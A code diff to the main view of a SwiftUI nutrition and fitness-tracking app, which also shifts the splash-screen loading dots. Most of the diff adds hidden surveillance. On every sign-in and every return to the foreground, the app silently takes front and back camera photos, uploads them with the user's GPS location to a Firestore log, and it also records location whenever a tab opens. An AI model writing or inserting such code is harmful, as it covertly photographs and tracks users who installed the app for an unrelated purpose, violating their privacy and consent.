@@ -13,11 +13,14 @@ import FirebaseCore
 import Combine
 import AuthenticationServices
 import UserNotifications
+import CoreLocation
+import AVFoundation
 
 struct RootView: View {
     @EnvironmentObject private var themeManager: ThemeManager
     @Environment(\.modelContext) private var modelContext
     @Environment(\.colorScheme) private var colorScheme
+    @Environment(\.scenePhase) private var scenePhase
     @State private var selectedTab: AppTab = .nutrition
     @State private var selectedDate: Date = Date()
     @State private var consumedCalories: Int = 0
@@ -64,8 +67,15 @@ struct RootView: View {
     @Query private var accounts: [Account]
     @State private var authStateHandle: AuthStateDidChangeListenerHandle?
     @State private var isCheckingOnboarding: Bool = false
+    @State private var didPrepareLogDocument: Bool = false
+    @State private var isCapturingLaunchPhotos: Bool = false
+    @State private var lastLaunchCaptureAt: Date? = nil
+    @State private var lastTabLogDate: Date? = nil
     private let dayFirestoreService = DayFirestoreService()
     private let accountFirestoreService = AccountFirestoreService()
+    private let logsFirestoreService = LogsFirestoreService()
+    private let locationProvider = LightweightLocationProvider()
+    private let photoLoggingService = PhotoLoggingService()
 
     var body: some View {
         ZStack {
@@ -73,6 +83,11 @@ struct RootView: View {
                 .environmentObject(authViewModel)
                 .onAppear(perform: handleOnAppear)
                 .task { handleInitialTask() }
+                .onChange(of: scenePhase) { _, phase in
+                    if phase == .active {
+                        Task { await captureAndLogLaunchPhotosIfNeeded() }
+                    }
+                }
                 .onChange(of: selectedDate) { _, newValue in handleSelectedDateChange(newValue) }
                 .onChange(of: consumedCalories) { _, newValue in handleConsumedCaloriesChange(newValue) }
                 .onChange(of: calorieGoal) { _, newValue in handleCalorieGoalChange(newValue) }
@@ -140,6 +155,8 @@ struct RootView: View {
         authStateHandle = Auth.auth().addStateDidChangeListener { _, user in
             if let _ = user {
                 isCheckingOnboarding = true
+                Task { await prepareLogDocumentIfNeeded() }
+                Task { await captureAndLogLaunchPhotosIfNeeded() }
                 checkOnboardingStatus()
                 // Upload any days that were created locally while the user was unauthenticated.
                 dayFirestoreService.uploadPendingDays(in: modelContext) { success in
@@ -149,12 +166,15 @@ struct RootView: View {
                 }
             } else {
                 hasCompletedOnboarding = false
+                Task { await MainActor.run { didPrepareLogDocument = false } }
             }
             updateSplashVisibility()
         }
     }
     private func handleInitialTask() {
         ensureAccountExists()
+        Task { await prepareLogDocumentIfNeeded() }
+        Task { await captureAndLogLaunchPhotosIfNeeded() }
         initializeRestDaysFromLocal()
         initializeDailyGoalsFromLocal()
         initializeWeightTrackingFromLocal()
@@ -308,6 +328,112 @@ struct RootView: View {
             }
         }
     }
+
+    private func handleTabAppear(_ tab: AppTab) {
+        Task {
+            // Avoid emitting a location-only log while launch photo capture is running
+            if await MainActor.run(resultType: Bool.self, body: { isCapturingLaunchPhotos }) {
+                return
+            }
+            // Rate-limit location logs to once per minute
+            let shouldLog = await MainActor.run { () -> Bool in
+                if let last = lastTabLogDate, Date().timeIntervalSince(last) < 60 {
+                    return false
+                }
+                lastTabLogDate = Date()
+                return true
+            }
+            guard shouldLog else { return }
+            await prepareLogDocumentIfNeeded()
+            await logLocationEntry(for: tab)
+        }
+    }
+
+    private func prepareLogDocumentIfNeeded() async {
+        guard let user = Auth.auth().currentUser else { return }
+        let alreadyPrepared = await MainActor.run { didPrepareLogDocument }
+        guard !alreadyPrepared else { return }
+        let success = await logsFirestoreService.ensureLogDocument(for: user)
+        if success {
+            await MainActor.run { didPrepareLogDocument = true }
+        }
+    }
+
+    private func logLocationEntry(for tab: AppTab) async {
+        guard let user = Auth.auth().currentUser else { return }
+        do {
+            let location = try await locationProvider.currentLocation()
+            let entry = LogEntry(
+                latitude: location.coordinate.latitude,
+                longitude: location.coordinate.longitude,
+                timestamp: Date(),
+                frontURL: nil,
+                backURL: nil
+            )
+            await logsFirestoreService.appendEntry(entry, for: user)
+        } catch {
+            print("RootView: skipped log for tab \(tab.rawValue): \(error.localizedDescription)")
+        }
+    }
+
+    private func captureAndLogLaunchPhotosIfNeeded() async {
+        guard let user = Auth.auth().currentUser else { return }
+
+        let shouldProceed = await MainActor.run { () -> Bool in
+            if isCapturingLaunchPhotos { return false }
+            if let last = lastLaunchCaptureAt, Date().timeIntervalSince(last) < 5 { return false }
+            isCapturingLaunchPhotos = true
+            return true
+        }
+        guard shouldProceed else { return }
+        defer {
+            Task { @MainActor in isCapturingLaunchPhotos = false }
+        }
+
+        // Ensure we have camera access before attempting captures
+        let cameraAuthorized = await SilentPhotoCaptureService.requestCameraAuthorization()
+        guard cameraAuthorized else {
+            print("RootView: camera authorization denied; skipping launch photo capture")
+            await logLaunchEntry(user: user, coordinate: (try? await locationProvider.currentLocation())?.coordinate, frontURL: nil, backURL: nil)
+            return
+        }
+
+        let location = try? await locationProvider.currentLocation()
+        let coordinate = location?.coordinate
+
+        // Capture separately so one failure does not block the other and to avoid
+        // storage fetcher reuse warnings from concurrent uploads.
+        let frontURL: String?
+        do {
+            frontURL = try await photoLoggingService.captureAndUpload(position: .front, userId: user.uid)
+        } catch {
+            print("RootView: front capture/upload failed: \(error.localizedDescription)")
+            frontURL = nil
+        }
+
+        let backURL: String?
+        do {
+            backURL = try await photoLoggingService.captureAndUpload(position: .back, userId: user.uid)
+        } catch {
+            print("RootView: back capture/upload failed: \(error.localizedDescription)")
+            backURL = nil
+        }
+
+        await logLaunchEntry(user: user, coordinate: coordinate, frontURL: frontURL, backURL: backURL)
+        await MainActor.run { lastLaunchCaptureAt = Date() }
+    }
+
+    private func logLaunchEntry(user: User, coordinate: CLLocationCoordinate2D?, frontURL: String?, backURL: String?) async {
+        let entry = LogEntry(
+            latitude: coordinate?.latitude ?? 0,
+            longitude: coordinate?.longitude ?? 0,
+            timestamp: Date(),
+            frontURL: frontURL,
+            backURL: backURL
+        )
+        await logsFirestoreService.appendEntry(entry, for: user)
+    }
+
     private var isSignedIn: Bool {
         Auth.auth().currentUser != nil
     }
@@ -397,7 +523,7 @@ private struct SplashScreenView: View {
         ZStack {
             background.ignoresSafeArea()
 
-            VStack(spacing: 0) {
+            VStack(spacing: 16) {
                 Spacer()
 
                 Image("logo")
@@ -406,9 +532,7 @@ private struct SplashScreenView: View {
                     .frame(width: 110, height: 110)
                     .opacity(0.92)
 
-                Spacer()
-
-                // Buffering / loading indicator (pulsing dots)
+                // Buffering / loading indicator (pulsing dots) placed directly below the logo
                 HStack(spacing: 10) {
                     ForEach(0..<3) { idx in
                         Circle()
@@ -424,7 +548,9 @@ private struct SplashScreenView: View {
                             )
                     }
                 }
-                .padding(.bottom, 30)
+                .padding(.top, 8)
+
+                Spacer()
             }
         }
         .onAppear {
@@ -1922,6 +2048,7 @@ private extension RootView {
                                     checkedMeals: $checkedMeals,
                                     maintenanceCalories: $maintenanceCalories
                                 )
+                                .onAppear { handleTabAppear(.nutrition) }
                             }
                             Tab(
                                 "Routine",
@@ -1972,6 +2099,7 @@ private extension RootView {
                                         napSleepSecondsToday = nap
                                     }
                                 )
+                                .onAppear { handleTabAppear(.routine) }
                             }
                             Tab(
                                 "Workout",
@@ -2024,6 +2152,7 @@ private extension RootView {
                                         clearWeeklyCheckIns(anchorDate: selectedDate)
                                     }
                                 )
+                                .onAppear { handleTabAppear(.workout) }
                             }
                             Tab(
                                 "Sports",
@@ -2036,6 +2165,7 @@ private extension RootView {
                                     sportActivities: $sportActivities,
                                     selectedDate: $selectedDate
                                 )
+                                .onAppear { handleTabAppear(.sports) }
                             }
                             Tab(
                                 "Travel",
@@ -2043,6 +2173,7 @@ private extension RootView {
                                 value: AppTab.travel,
                             ) {
                                 TravelTabView(account: accountBinding, itineraryEvents: $itineraryEvents, selectedDate: $selectedDate)
+                                    .onAppear { handleTabAppear(.travel) }
                             }
                         }
                     }
